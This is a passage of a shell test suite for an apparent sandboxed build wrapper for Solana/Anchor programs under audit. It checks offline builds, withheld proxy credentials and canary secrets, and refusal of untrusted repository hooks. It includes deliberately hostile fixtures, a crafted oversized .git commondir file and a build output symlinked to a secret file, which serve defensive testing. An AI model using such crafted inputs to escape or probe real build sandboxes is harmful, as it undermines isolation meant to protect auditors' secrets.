check "the copy is the committed HEAD (v2)" in_blocks '^== cargo build-sbf --skip' '^show: // v2$'
check "cargo fetch runs outside the copy, so the copy's .cargo/config is not read" in_blocks '^== cargo fetch' '^cargo-config-here: no$'
check "cargo fetch gets the proxy variables" in_blocks '^== cargo fetch' "^env: HTTPS_PROXY=http://user:CANARY-proxy@127[.]0[.]0[.]1:9\$"
check "cargo build-sbf --install-only gets the real HOME and the proxy" \
  sh -c "awk '/^== cargo build-sbf --install-only/{on=1;next} /^== /{on=0} on' '$T/calls' > '$T/blk' && grep -qxF 'home: $CLEANHOME' '$T/blk' && grep -qxF 'env: HTTPS_PROXY=$PROXY' '$T/blk'"
check "the build gets the throwaway HOME, with a keypair and the platform tools linked from the real one" \
  sh -c "awk '/^== cargo build-sbf --skip/{on=1;next} /^== /{on=0} on' '$T/calls' > '$T/blk' && grep -qxF 'home: $S/home' '$T/blk' && grep -qxF 'keypair: yes' '$T/blk' && grep -qxF 'tools: $CLEANHOME/.cache/solana' '$T/blk' && grep -qxF 'cwd: $S/src' '$T/blk'"
check "the build runs offline, without the proxy variables" in_blocks '^== cargo build-sbf --skip' '^env: CARGO_NET_OFFLINE=true$'
check "... and no proxy variable reaches it" none_in_blocks '^== cargo build-sbf --skip' '^env: [A-Za-z_]*[Pp][Rr][Oo][Xx][Yy]='
check "the toolchain is pinned to rustup's default, and rustup installs nothing" \
  sh -c "awk '/^== cargo build-sbf --skip/{on=1;next} /^== /{on=0} on' '$T/calls' > '$T/blk' && grep -qxF 'env: RUSTUP_TOOLCHAIN=stable-fake' '$T/blk' && grep -qxF 'env: RUSTUP_AUTO_INSTALL=0' '$T/blk'"
check "no canary variable reaches any step" sh -c "grep -q '^env: ' '$T/calls' && ! grep -q 'canary' '$T/calls'"
check "every watched step has ulimit -f 4 GiB and ulimit -t of four times what is left of the limit" \
  sh -c "grep -qE '^ulimit: 7[0-9]{3} 4194304\$' '$T/calls' && ! grep '^ulimit: ' '$T/calls' | grep -v '^ulimit: unlimited unlimited\$' | grep -vE '^ulimit: (7[0-9]{3}) 4194304\$' | grep -q ."
check "the .so is the build's, and nothing else of the output is kept" \
  sh -c "[ \"\$(cat '$WT/audit_1/exec/build-sbf-1/demo.so')\" = \"\$(printf '\\177ELFdemo')\" ] && [ \"\$(ls '$WT/audit_1/exec/build-sbf-1')\" = demo.so ]"
check "the log is kept, with every step, and without the proxy's token" \
  sh -c "grep -q '^>> cargo build-sbf --install-only\$' '$WT/audit_1/exec/build-sbf-1.log' && ! grep -q 'CANARY-proxy' '$WT/audit_1/exec/build-sbf-1.log'"
check "the scratch directory is gone afterwards" sh -c "[ '$RC' = 0 ] && [ -z \"\$(ls -A '$NT')\" ]"
check "no program or hook the source repository's config names ran during the clone and checkout" sh -c "[ '$RC' = 0 ] && [ -z \"\$(ls -A '$T/marks')\" ]"
run "$TARGET" "$WT" -- build-sbf --run audit_1 --src . --rev "$V1"
check "--rev checks out that commit" in_blocks '^== cargo build-sbf --skip' '^show: // v1$'
check "... and the next run is numbered 2" test -f "$WT/audit_1/exec/build-sbf-2/demo.so"
run "$TARGET" "$WT" -- build-sbf --run audit_1 --src . --rev deadbeef
check "a --rev that names no commit: exit 3, nothing built, the log kept" \
  sh -c "[ '$RC' = 3 ] && grep -q '^target: blocker: deadbeef is not a commit in .; log audit_1/exec/build-sbf-[0-9]*[.]log\$' '$T/err' && ! grep -q '^== cargo' '$T/calls'"
run "$TARGET" "$WT" -- build-sbf --run audit_1 --src . --patch audit_1/patches/F-1.patch
check "--patch is applied before the build" in_blocks '^== cargo build-sbf --skip' '^show: // patched$'
run "$TARGET" "$WT" -- build-sbf --run audit_1 --src . --patch audit_1/patches/F-3.patch
check "a patch that does not apply: exit 3, nothing built" \
  sh -c "[ '$RC' = 3 ] && grep -q '^target: blocker: audit_1/patches/F-3.patch does not apply to $V2; log ' '$T/err' && ! grep -q '^== cargo' '$T/calls'"
run "$TARGET" "$WT" -- build-sbf --run audit_1 --src audit_1/src.git
check "--src may be the copy git-ro.sh copy made in the run directory" in_blocks '^== cargo build-sbf --skip' '^show: // v2$'
# Only git's own answer says --src is in no repository: a .git file naming a directory that bears git's words for
# that, with a commondir past 16 KiB, is refused for that file, never copied as a plain tree.
A="$T/odd-admin/not a git repository"
mkdir -p "$A" "$WT/nested"
printf 'ref: refs/heads/main\n' > "$A/HEAD"
{ printf '../..\n'; awk 'BEGIN { for (i = 0; i < 17000; i++) printf "\n" }'; } > "$A/commondir"
printf 'gitdir: %s\n' "$A" > "$WT/nested/.git"
s="$A/commondir"
[ "${#s}" -le 200 ] || s="${s:0:200}..."
printf 'target: refused: a .git file or commondir file holds a NUL byte or more than 16 KiB, so where git would look cannot be told: %s\n' \
  "$s" > "$T/want-err"
run "$TARGET" "$WT" -- build-sbf --run audit_1 --src nested
check "a --src whose .git file names a commondir past 16 KiB is refused for it, whatever its directory is named" \
  sh -c "[ '$RC' = 64 ] && cmp -s '$T/err' '$T/want-err' && ! grep -q '^== cargo' '$T/calls'"
rm -rf "$WT/nested"
run "$TARGET" "$WT" TOOLS_VERSION=v1.54 -- build-sbf --run audit_1 --src . --package demo
check "--package builds that member, and TOOLS_VERSION goes to the install and the build" calls_are \
  "rustup default|cargo fetch --manifest-path $S/src/Cargo.toml|cargo build-sbf --help|cargo build-sbf --install-only --tools-version v1.54|cargo metadata --no-deps --format-version 1 --offline --manifest-path $S/src/Cargo.toml|cargo build-sbf --skip-tools-install --offline --sbf-out-dir $S/out --tools-version v1.54 --manifest-path $S/src/programs/demo/Cargo.toml|"
run "$TARGET" "$WT" -- build-sbf --run audit_1 --src . --package nope
check "a --package the workspace does not have: exit 3, nothing built" \
  sh -c "[ '$RC' = 3 ] && grep -q '^target: blocker: the workspace at the top of the copy has no member package nope' '$T/err' && ! grep -q '^== cargo build-sbf --skip' '$T/calls'"
# A cargo build-sbf without --install-only, --skip-tools-install and --offline. Natively the build runs without
# those options, offline in the throwaway HOME still, so its code gets neither the real HOME nor the network,
# with the platform tools already in ~/.cache/solana: the version its --version names (the stand-in says
# platform-tools v1.43), or TOOLS_VERSION. When they are not there the run stops before the build and names the
# install. In isolated mode the build runs with the real HOME and the proxy variables, as templates/poc/run.sh
# builds each arm then, and a note says so.
settings FAKE_SBF_HELP=old
LACKS='this cargo build-sbf has no --install-only, --skip-tools-install or --offline, so in native mode it builds offline in the throwaway HOME, with only the platform tools already in ~/.cache/solana'
run "$TARGET" "$WT" HTTPS_PROXY="$PROXY" -- build-sbf --run audit_1 --src .
check "natively, such a cargo build-sbf whose platform tools are not in ~/.cache/solana: exit 3 before the build, naming the install" \
  sh -c "[ '$RC' = 3 ] && grep -q '^target: blocker: $LACKS, and platform-tools v1.43 is not there; install it once outside the audit (cargo build-sbf --tools-version v1.43 in any program crate downloads it), then run this again; log audit_1/exec/build-sbf-[0-9]*[.]log\$' '$T/err' && ! grep -q '^== cargo build-sbf --install' '$T/calls' && ! grep -q '^== cargo build-sbf --sbf' '$T/calls'"
mkdir -p "$CLEANHOME/.cache/solana/v1.43/platform-tools"
OLDNAT='>> note: this cargo build-sbf has no --install-only, --skip-tools-install or --offline: in native mode the build runs offline in the throwaway HOME, with platform-tools v1.43 from ~/.cache/solana'
run "$TARGET" "$WT" HTTPS_PROXY="$PROXY" -- build-sbf --run audit_1 --src .
check "... with them there: exit 0, the .so kept, and a note names native mode" \
  sh -c "[ '$RC' = 0 ] && grep -qxF '$OLDNAT' '$T/out' && sed -n '\$p' '$T/out' | grep -q '^>> build-sbf: ok (exit 0); log audit_1/exec/build-sbf-[0-9]*[.]log; 1 .so in audit_1/exec/build-sbf-[0-9]*/: demo.so\$'"
check "... no install, the version asked, and the build without --skip-tools-install and --offline" calls_are \
  "rustup default|cargo fetch --manifest-path $S/src/Cargo.toml|cargo build-sbf --help|cargo build-sbf --version|cargo build-sbf --sbf-out-dir $S/out|"
check "... in the copy, in the throwaway HOME with its keypair and that version's tools linked from the real cache, not the cache itself, offline, without the proxy" \
  sh -c "awk '/^== cargo build-sbf --sbf-out-dir/{on=1;next} /^== /{on=0} on' '$T/calls' > '$T/blk' && grep -qxF 'cwd: $S/src' '$T/blk' && grep -qxF 'home: $S/home' '$T/blk' && grep -qxF 'keypair: yes' '$T/blk' && grep -qxF 'tools: ' '$T/blk' && grep -qxF 'tool-links: v1.43 -> $CLEANHOME/.cache/solana/v1.43 ' '$T/blk' && grep -qxF 'env: CARGO_NET_OFFLINE=true' '$T/blk' && ! grep -q '^env: [A-Za-z_]*[Pp][Rr][Oo][Xx][Yy]=' '$T/blk'"
rm -rf "$CLEANHOME/.cache"
mkdir -p "$CLEANHOME/.cache/solana/v1.51/platform-tools"
run "$TARGET" "$WT" TOOLS_VERSION=v1.51 HTTPS_PROXY="$PROXY" -- anchor-build --run audit_1 --src . --program demo
check "natively, anchor-build with that cargo build-sbf and TOOLS_VERSION's tools there: anchor build without those options, TOOLS_VERSION after --, its version not asked" calls_are \
  "rustup default|cargo fetch --manifest-path $S/src/Cargo.toml|anchor build --help|anchor idl build --help|cargo build-sbf --help|anchor build -p demo -- --tools-version v1.51|"
check "... offline in the throwaway HOME, that version's tools linked, without the proxy, and the note" \
  sh -c "[ '$RC' = 0 ] && grep -qxF '>> note: this cargo build-sbf has no --install-only, --skip-tools-install or --offline: in native mode the build runs offline in the throwaway HOME, with platform-tools v1.51 from ~/.cache/solana' '$T/out' && awk '/^== anchor build/{on=1;next} /^== /{on=0} on' '$T/calls' > '$T/blk' && grep -qxF 'home: $S/home' '$T/blk' && grep -qxF 'tool-links: v1.51 -> $CLEANHOME/.cache/solana/v1.51 ' '$T/blk' && grep -qxF 'env: CARGO_NET_OFFLINE=true' '$T/blk' && ! grep -q '^env: [A-Za-z_]*[Pp][Rr][Oo][Xx][Yy]=' '$T/blk'"
rm -rf "$CLEANHOME/.cache"
settings FAKE_SBF_HELP=old FAKE_SBF_TOOLS=none
run "$TARGET" "$WT" -- build-sbf --run audit_1 --src .
check "natively, such a cargo build-sbf whose --version names no platform tools: exit 3 before the build, asking for TOOLS_VERSION" \
  sh -c "[ '$RC' = 3 ] && grep -q '^target: blocker: $LACKS, and its --version names no platform tools version to look for there; set TOOLS_VERSION to the one it uses; log ' '$T/err' && ! grep -q '^== cargo build-sbf --sbf' '$T/calls'"
settings FAKE_SBF_HELP=old
if [ "$ISOLATED_OK" = 1 ]; then
  OLDSBF='>> note: this cargo build-sbf has no --install-only, --skip-tools-install or --offline: in isolated mode the build runs with the real HOME and the proxy variables'
  run "$TARGET" "$WT" AUDITOR_EXEC_MODE=isolated HTTPS_PROXY="$PROXY" -- build-sbf --run audit_1 --src .
  check "isolated mode, the same cargo build-sbf: exit 0, the .so kept, and a note says how it built" \
    sh -c "[ '$RC' = 0 ] && grep -qxF '$OLDSBF' '$T/out' && sed -n '\$p' '$T/out' | grep -q '^>> build-sbf: ok (exit 0); log audit_1/exec/build-sbf-[0-9]*[.]log; 1 .so in audit_1/exec/build-sbf-[0-9]*/: demo.so\$'"
  check "... no install, and the build without --skip-tools-install and --offline" calls_are \
    "rustup default|cargo fetch --manifest-path $S/src/Cargo.toml|cargo build-sbf --help|cargo build-sbf --sbf-out-dir $S/out|"
  check "... in the copy, with the real HOME and the proxy, cargo not held offline" \
    sh -c "awk '/^== cargo build-sbf --sbf-out-dir/{on=1;next} /^== /{on=0} on' '$T/calls' > '$T/blk' && grep -qxF 'cwd: $S/src' '$T/blk' && grep -qxF 'home: $CLEANHOME' '$T/blk' && grep -qxF 'env: HTTPS_PROXY=$PROXY' '$T/blk' && ! grep -q '^env: CARGO_NET_OFFLINE=' '$T/blk'"
  run "$TARGET" "$WT" AUDITOR_EXEC_MODE=isolated TOOLS_VERSION=v1.54 HTTPS_PROXY="$PROXY" -- anchor-build --run audit_1 --src . --program demo
  check "isolated mode, anchor-build with that cargo build-sbf: anchor build without those options, TOOLS_VERSION after --" calls_are \
    "rustup default|cargo fetch --manifest-path $S/src/Cargo.toml|anchor build --help|anchor idl build --help|cargo build-sbf --help|anchor build -p demo -- --tools-version v1.54|"
  check "... with the real HOME and the proxy, and the note" \
    sh -c "[ '$RC' = 0 ] && grep -qxF '$OLDSBF' '$T/out' && awk '/^== anchor build/{on=1;next} /^== /{on=0} on' '$T/calls' > '$T/blk' && grep -qxF 'home: $CLEANHOME' '$T/blk' && grep -qxF 'env: HTTPS_PROXY=$PROXY' '$T/blk'"
  run "$TARGET" "$WT" AUDITOR_STRICT=1 HTTPS_PROXY="$PROXY" -- build-sbf --run audit_1 --src .
  check "strict mode, which is isolated, builds the same way, with the same note" \
    sh -c "[ '$RC' = 0 ] && grep -qxF '$OLDSBF' '$T/out' && awk '/^== cargo build-sbf --sbf-out-dir/{on=1;next} /^== /{on=0} on' '$T/calls' > '$T/blk' && grep -qxF 'home: $CLEANHOME' '$T/blk'"
fi
settings FAKE_INSTALL_RC=1
run "$TARGET" "$WT" -- build-sbf --run audit_1 --src .
check "an install of the platform tools that fails: exit 3" \
  sh -c "[ '$RC' = 3 ] && grep -q '^target: blocker: cargo build-sbf --install-only, the install of the platform tools, failed (exit 1); log ' '$T/err'"
settings FAKE_FETCH_RC=101
run "$TARGET" "$WT" -- build-sbf --run audit_1 --src .
check "a download that fails: exit 3, nothing built" \
  sh -c "[ '$RC' = 3 ] && grep -q '^target: blocker: cargo fetch, the download of the dependencies, failed (exit 101)' '$T/err' && ! grep -q '^== cargo build-sbf' '$T/calls'"
settings FAKE_BUILD_RC=101
run "$TARGET" "$WT" -- build-sbf --run audit_1 --src .
check "a build that fails: exit 1, the log kept" \
  sh -c "[ '$RC' = 1 ] && grep -q '^>> build-sbf: cargo build-sbf failed (exit 101); log audit_1/exec/build-sbf-[0-9]*[.]log' '$T/out'"
printf 'secret\n' > "$T/secret"
settings FAKE_SO_NAMES='demo other' FAKE_SO_LINK="$T/secret" FAKE_SO_BIG=104857601
run "$TARGET" "$WT" -- build-sbf --run audit_1 --src .
n=$(sed -n 's/.*audit_1\/exec\/build-sbf-\([0-9]*\)\/:.*/\1/p' "$T/out")
check "only regular .so files of at most 100 MiB are kept: not a link, not an oversized one" \
  sh -c "[ '$RC' = 0 ] && grep -q '2 .so in audit_1/exec/build-sbf-$n/: demo.so, other.so; 2 other .so not kept (symbolic links, larger than 100 MiB' '$T/out' && [ \"\$(ls '$WT/audit_1/exec/build-sbf-$n' | tr '\n' ' ')\" = 'demo.so other.so ' ]"
# In name order, whatever order the build directory lists them in (ext4 hashes names; APFS lists zeta.so
# before beta.so), and past the 64th by that order: s64.so is the one left out of 65.
settings FAKE_SO_NAMES='zeta demo beta other'
run "$TARGET" "$WT" -- build-sbf --run audit_1 --src .
n=$(sed -n 's/.*audit_1\/exec\/build-sbf-\([0-9]*\)\/:.*/\1/p' "$T/out")
check "... named and kept in name order, whatever order the directory lists them in" \
  sh -c "[ '$RC' = 0 ] && sed -n '\$p' '$T/out' | grep -q '; 4 .so in audit_1/exec/build-sbf-$n/: beta.so, demo.so, other.so, zeta.so\$'"
settings FAKE_SO_NAMES="$(i=64; while [ "$i" -ge 0 ]; do printf 's%02d ' "$i"; i=$((i - 1)); done)"
run "$TARGET" "$WT" -- build-sbf --run audit_1 --src .
n=$(sed -n 's/.*audit_1\/exec\/build-sbf-\([0-9]*\)\/:.*/\1/p' "$T/out")
check "... and the first 64 by that order are kept when the build makes more" \
  sh -c "[ '$RC' = 0 ] && grep -q '; 1 other .so not kept (a symbolic link, larger than 100 MiB, past 64, or an odd name)\$' '$T/out' && [ \"\$(ls '$WT/audit_1/exec/build-sbf-$n' | wc -l | tr -d ' ')\" = 64 ] && [ -f '$WT/audit_1/exec/build-sbf-$n/s63.so' ] && [ ! -e '$WT/audit_1/exec/build-sbf-$n/s64.so' ]"
settings

# =================================================================================================
# target.sh: the other actions' command lines.
# =================================================================================================
run "$TARGET" "$WT" HTTPS_PROXY="$PROXY" -- cargo-test --run audit_1 --src .
check "cargo-test: cargo fetch, then cargo test --offline --workspace in the copy" calls_are \
  "rustup default|cargo fetch --manifest-path $S/src/Cargo.toml|cargo test --offline --workspace|"
check "... offline and without the proxy" none_in_blocks '^== cargo test' '^env: [A-Za-z_]*[Pp][Rr][Oo][Xx][Yy]='
check "... with the throwaway HOME" in_blocks '^== cargo test' "^home: $S/home\$"
check "... and its last line" sh -c "[ '$RC' = 0 ] && sed -n '\$p' '$T/out' | grep -qx '>> cargo-test: ok (exit 0); log audit_1/exec/cargo-test-[0-9]*[.]log'"
run "$TARGET" "$WT" -- cargo-test --run audit_1 --src . --package demo
check "cargo-test --package: -p <package>" has_call 'cargo test --offline -p demo'
settings FAKE_TEST_RC=101
run "$TARGET" "$WT" -- cargo-test --run audit_1 --src .
check "a test suite that fails: exit 1" sh -c "[ '$RC' = 1 ] && grep -q '^>> cargo-test: cargo test failed (exit 101); log ' '$T/out'"
settings
run "$TARGET" "$WT" -- cargo-test --run audit_1 --src . --dir programs/demo
check "--dir runs the action there" calls_are "rustup default|cargo fetch --manifest-path $S/src/programs/demo/Cargo.toml|cargo test --offline --workspace|"
check "... in that directory of the copy" in_blocks '^== cargo test' "^cwd: $S/src/programs/demo\$"
run "$TARGET" "$WT" -- cargo-test --run audit_1 --src . --dir nope
check "a --dir the copy does not have: exit 3" sh -c "[ '$RC' = 3 ] && grep -q '^target: blocker: --dir nope is not a directory in the copy' '$T/err'"
run "$TARGET" "$WT" -- clippy --run audit_1 --src .
check "clippy: its version first, then cargo clippy --offline --all-targets --workspace -- -W clippy::all -W clippy::pedantic" \
  calls_are "rustup default|cargo fetch --manifest-path $S/src/Cargo.toml|cargo clippy --version|cargo clippy --offline --all-targets --workspace -- -W clippy::all -W clippy::pedantic|"
check "... and the warning count" sh -c "grep -q '^>> clippy: ok (exit 0), 2 warning lines; log ' '$T/out'"
settings FAKE_CLIPPY=missing
run "$TARGET" "$WT" -- clippy --run audit_1 --src .
check "clippy that is not installed: exit 3" sh -c "[ '$RC' = 3 ] && grep -q 'clippy is not installed for the pinned toolchain' '$T/err' && ! grep -q '^== cargo clippy --offline' '$T/calls'"
settings
run "$TARGET" "$WT" -- anchor-build --run audit_1 --src . --program demo
check "anchor-build: the downloads, anchor's own options asked, then anchor build -p <program> -- --skip-tools-install --offline (an anchor whose build has neither --ignore-keys nor --no-idl)" \
  calls_are "rustup default|cargo fetch --manifest-path $S/src/Cargo.toml|anchor build --help|anchor idl build --help|cargo build-sbf --help|cargo build-sbf --install-only|anchor build -p demo -- --skip-tools-install --offline|"
check "... and the program's .so is kept from target/deploy" sh -c "grep -q '1 .so in audit_1/exec/anchor-build-[0-9]*/: demo.so' '$T/out'"
check "... the build in the throwaway HOME, with its keypair" in_blocks '^== anchor build' '^keypair: yes$'
check "... and with no ~/.avm, no AVM_HOME and no .avm link" sh -c "awk '/^== anchor build/{on=1;next} /^== /{on=0} on' '$T/calls' > '$T/blk' && grep -qxF 'avm: unset' '$T/blk' && grep -qxF 'avm-link: ' '$T/blk'"
# avm's anchor shim finds its releases through AVM_HOME, which every step gets when ~/.avm exists (the K row
# keeps no credential from it), and avm releases before AVM_HOME through the .avm the throwaway HOME links.
AVMHOME=$T/home-avm
mkdir -p "$AVMHOME/.avm/bin"
run "$TARGET" "$WT" HOME="$AVMHOME" -- anchor-test --run audit_1 --src .
check "anchor-test with ~/.avm: every anchor call (its two help calls, anchor build and anchor test) gets AVM_HOME, and the throwaway HOME links .avm" \
  sh -c "[ '$RC' = 0 ] && [ \"\$(grep -c '^== anchor ' '$T/calls')\" = 4 ] && [ \"\$(grep -cxF 'avm: $AVMHOME/.avm' '$T/calls')\" = 4 ] && [ \"\$(grep -cxF 'avm-link: $AVMHOME/.avm' '$T/calls')\" = 4 ] && grep -qxF 'home: $S/home' '$T/calls'"
check "... and so does every other step, with nothing written in ~/.avm" \
  sh -c "[ \"\$(awk '/^== /{n++} /^env: AVM_HOME=/{a++} END{print (n == a)}' '$T/calls')\" = 1 ] && [ -z \"\$(ls -A '$AVMHOME/.avm/bin')\" ]"
mkdir -p "$T/avm-own"
run "$TARGET" "$WT" HOME="$AVMHOME" AVM_HOME="$T/avm-own" -- anchor-build --run audit_1 --src .
check "... an AVM_HOME of the caller's that exists wins" in_blocks '^== anchor build' "^avm: $T/avm-own\$"
run "$TARGET" "$WT" AVM_HOME="$T/no-such-avm" -- anchor-build --run audit_1 --src .
check "... and one that does not exist is not passed" in_blocks '^== anchor build' '^avm: unset$'
run "$TARGET" "$WT" HTTPS_PROXY="$PROXY" -- anchor-test --run audit_1 --src .
check "anchor-test: npm ci --ignore-scripts first, then the build, then anchor test against no validator and no deploy" \
  calls_are "rustup default|cargo fetch --manifest-path $S/src/Cargo.toml|anchor build --help|anchor idl build --help|cargo build-sbf --help|cargo build-sbf --install-only|npm ci --ignore-scripts --no-audit --no-fund|anchor build -- --skip-tools-install --offline|anchor test --skip-build --skip-deploy --skip-local-validator --provider.cluster localnet --provider.wallet $S/home/.config/solana/id.json|"
check "... npm ci gets the proxy, its own empty config files and the git on PATH" \
  sh -c "awk '/^== npm ci/{on=1;next} /^== /{on=0} on' '$T/calls' > '$T/blk' && grep -qxF 'env: HTTPS_PROXY=$PROXY' '$T/blk' && grep -qxF 'env: npm_config_userconfig=$S/npm/userconfig' '$T/blk' && grep -qxF 'env: npm_config_globalconfig=$S/npm/globalconfig' '$T/blk' && grep -qxF 'env: npm_config_git=$T/sys/git' '$T/blk' && grep -qxF 'env: npm_config_ignore_scripts=true' '$T/blk' && grep -qxF 'userconfig-bytes: 0' '$T/blk'"
check "... and NODE_OPTIONS and npm's node-options preload target.sh's module into npm" \
  sh -c "awk '/^== npm ci/{on=1;next} /^== /{on=0} on' '$T/calls' > '$T/blk' && grep -qxF 'env: NODE_OPTIONS=--require=\"$S/npm/preload.js\"' '$T/blk' && grep -qxF 'env: npm_config_node_options=--require=\"$S/npm/preload.js\"' '$T/blk'"
check "... and COREPACK_ENABLE_PROJECT_SPEC=0, so a Corepack npm shim takes no npm release from the copy's packageManager field" \
  in_blocks '^== npm ci' '^env: COREPACK_ENABLE_PROJECT_SPEC=0$'
check "... anchor test runs without the proxy" none_in_blocks '^== anchor test' '^env: [A-Za-z_]*[Pp][Rr][Oo][Xx][Yy]='
check "... and without that preload" none_in_blocks '^== anchor (build|test)' '^env: (NODE_OPTIONS|npm_config_[a-z_]*)='
run "$TARGET" "$WT" -- anchor-test --run audit_1 --src . --dir app
check "anchor-test where the lockfile is yarn's: no install, and a note says so" \
  sh -c "[ '$RC' = 0 ] && grep -q '^>> note: app holds a yarn, pnpm or bun lockfile' '$T/out' && ! grep -q '^== npm' '$T/calls'"
settings FAKE_ANCHOR_TEST_RC=1
run "$TARGET" "$WT" -- anchor-test --run audit_1 --src .
check "anchor-test whose tests fail: exit 1" sh -c "[ '$RC' = 1 ] && grep -q '^>> anchor-test: anchor test failed (exit 1)' '$T/out'"
settings
# Anchor 0.30 and later build the IDL with cargo test, which would get the build-sbf options after -- and the
# RUSTUP_TOOLCHAIN pin (anchor-cli 1.1 and 1.2 then try to install the toolchain and run "cargo +{toolchain}"):
# where anchor build --help lists --no-idl and anchor idl build --help --out-ts, the build takes --no-idl, and
# anchor-test builds the IDL in a step of its own. Anchor 1.2 asks cargo build-sbf for platform tools of its own
# (v1.57, with --arch v3): target.sh learns which from one anchor build with a recording cargo-build-sbf first
# on PATH, and installs those.
settings FAKE_ANCHOR=1.2 FAKE_ANCHOR_TOOLS=v1.57
run "$TARGET" "$WT" -- anchor-build --run audit_1 --src . --program demo
check "Anchor 1.2: the platform tools it asks for learned and installed, then anchor build --no-idl" calls_are \
  "rustup default|cargo fetch --manifest-path $S/src/Cargo.toml|anchor build --help|anchor idl build --help|cargo build-sbf --help|anchor build --ignore-keys --no-idl -p demo -- --skip-tools-install --offline|cargo build-sbf --install-only --tools-version v1.57|anchor build --ignore-keys --no-idl -p demo -- --skip-tools-install --offline|cargo-build-sbf build-sbf --tools-version v1.57 --arch v3 --skip-tools-install --offline|"
check "... exit 0, the .so kept, and the learning run built nothing (its cargo-build-sbf only recorded)" \
  sh -c "[ '$RC' = 0 ] && grep -q '1 .so in audit_1/exec/anchor-build-[0-9]*/: demo.so' '$T/out' && [ \"\$(grep -c '^== cargo-build-sbf ' '$T/calls')\" = 1 ]"
run "$TARGET" "$WT" TOOLS_VERSION=v1.58 -- anchor-build --run audit_1 --src . --program demo
check "... with TOOLS_VERSION: anchor build's own --tools-version, before --, and nothing learned" calls_are \
  "rustup default|cargo fetch --manifest-path $S/src/Cargo.toml|anchor build --help|anchor idl build --help|cargo build-sbf --help|cargo build-sbf --install-only --tools-version v1.58|anchor build --ignore-keys --no-idl --tools-version v1.58 -p demo -- --skip-tools-install --offline|cargo-build-sbf build-sbf --tools-version v1.58 --arch v3 --skip-tools-install --offline|"
settings FAKE_ANCHOR=1.2 FAKE_ANCHOR_TOOLS=v1.57 FAKE_SBF_NOCORE=1
run "$TARGET" "$WT" -- anchor-build --run audit_1 --src .
check "... platform tools that lack the program's target (no core crate for it): exit 3, naming TOOLS_VERSION" \
  sh -c "[ '$RC' = 3 ] && grep -q '^target: blocker: anchor build found no core crate for the program.s target: the platform tools it built with (v1.57) lack that target; set TOOLS_VERSION to the platform tools version this Anchor asks for (Anchor 1.2 asks for v1.57) and run this again; log ' '$T/err'"
settings FAKE_ANCHOR=1.1
run "$TARGET" "$WT" TOOLS_VERSION=v1.58 -- anchor-build --run audit_1 --src . --program demo
check "Anchor 1.1 with TOOLS_VERSION: --no-idl, and TOOLS_VERSION after --, since its anchor build has no --tools-version" calls_are \
  "rustup default|cargo fetch --manifest-path $S/src/Cargo.toml|anchor build --help|anchor idl build --help|cargo build-sbf --help|cargo build-sbf --install-only --tools-version v1.58|anchor build --ignore-keys --no-idl -p demo -- --skip-tools-install --offline --tools-version v1.58|"
# Anchor 0.31's anchor build has --no-idl but no --ignore-keys, which it would reject (as anchor-cli 0.31.1 does,
# with exit 2): neither the learning run nor the build gets it, and anchor-test still builds the IDL.
settings FAKE_ANCHOR=0.31
run "$TARGET" "$WT" -- anchor-test --run audit_1 --src .
check "Anchor 0.31: no --ignore-keys anywhere, --no-idl, then anchor idl build and anchor test" calls_are \
  "rustup default|cargo fetch --manifest-path $S/src/Cargo.toml|anchor build --help|anchor idl build --help|cargo build-sbf --help|anchor build --no-idl -- --skip-tools-install --offline|cargo build-sbf --install-only|npm ci --ignore-scripts --no-audit --no-fund|anchor build --no-idl -- --skip-tools-install --offline|anchor idl build -p demo -o $S/src/target/idl/demo.json -t $S/src/target/types/demo.ts|anchor test --skip-build --skip-deploy --skip-local-validator --provider.cluster localnet --provider.wallet $S/home/.config/solana/id.json|"
settings FAKE_ANCHOR=1.2 FAKE_ANCHOR_TOOLS=v1.57
run "$TARGET" "$WT" HTTPS_PROXY="$PROXY" -- anchor-test --run audit_1 --src .
check "anchor-test, Anchor 1.2: anchor build --no-idl, anchor idl build for the program built, then anchor test" calls_are \
  "rustup default|cargo fetch --manifest-path $S/src/Cargo.toml|anchor build --help|anchor idl build --help|cargo build-sbf --help|anchor build --ignore-keys --no-idl -- --skip-tools-install --offline|cargo build-sbf --install-only --tools-version v1.57|npm ci --ignore-scripts --no-audit --no-fund|anchor build --ignore-keys --no-idl -- --skip-tools-install --offline|cargo-build-sbf build-sbf --tools-version v1.57 --arch v3 --skip-tools-install --offline|anchor idl build -p demo -o $S/src/target/idl/demo.json -t $S/src/target/types/demo.ts|anchor test --skip-build --skip-deploy --skip-local-validator --provider.cluster localnet --provider.wallet $S/home/.config/solana/id.json|"
check "... exit 0, and anchor idl build runs offline, without RUSTUP_TOOLCHAIN and without the proxy" \
  sh -c "[ '$RC' = 0 ] && awk '/^== anchor idl build -p/{on=1;next} /^== /{on=0} on' '$T/calls' > '$T/blk' && grep -qxF 'env: CARGO_NET_OFFLINE=true' '$T/blk' && ! grep -q '^env: RUSTUP_TOOLCHAIN=' '$T/blk' && ! grep -q '^env: [A-Za-z_]*[Pp][Rr][Oo][Xx][Yy]=' '$T/blk'"
check "... the pin is in a rust-toolchain.toml target.sh wrote over the copy's own, which named a path" \
  sh -c "awk '/^== anchor idl build -p/{on=1;next} /^== /{on=0} on' '$T/calls' > '$T/blk' && grep -qxF 'toolchain-files: ./rust-toolchain.toml ' '$T/blk' && grep -qxF 'toolchain-top: [toolchain] channel = \"stable-fake\" ' '$T/blk'"
check "... while anchor build and anchor test keep RUSTUP_TOOLCHAIN" \
  sh -c "awk '/^== anchor (build --ignore-keys|test)/{on=1;next} /^== /{on=0} on' '$T/calls' > '$T/blk' && [ \"\$(grep -cxF 'env: RUSTUP_TOOLCHAIN=stable-fake' '$T/blk')\" = 3 ]"
# Every rust-toolchain file of the copy goes before that step, nested ones too.
IW=$T/idlwt
tgit clone -q "$WT" "$IW" 2>/dev/null
printf '[toolchain]\npath = "/nonexistent/nested"\n' > "$IW/programs/demo/rust-toolchain.toml"
printf 'nightly\n' > "$IW/programs/rust-toolchain"
tgit -C "$IW" add -A && tgit -C "$IW" commit -qm nested
( cd "$IW" && "$ROOT/scripts/rundir.sh" new audit ) >/dev/null && printf 'native\n' > "$IW/audit_1/exec-mode"
run "$TARGET" "$IW" -- anchor-test --run audit_1 --src .
check "... a copy with nested rust-toolchain files: all of them gone, and only target.sh's at the top" \
  sh -c "[ '$RC' = 0 ] && grep -qxF 'toolchain-files: ./rust-toolchain.toml ' '$T/calls' && grep -qxF 'toolchain-top: [toolchain] channel = \"stable-fake\" ' '$T/calls'"
settings
run "$TARGET" "$WT" HTTPS_PROXY="$PROXY" -- npm-ci --run audit_1 --src .
check "npm-ci: npm ci --ignore-scripts --no-audit --no-fund in the copy, and no Rust toolchain asked for" \
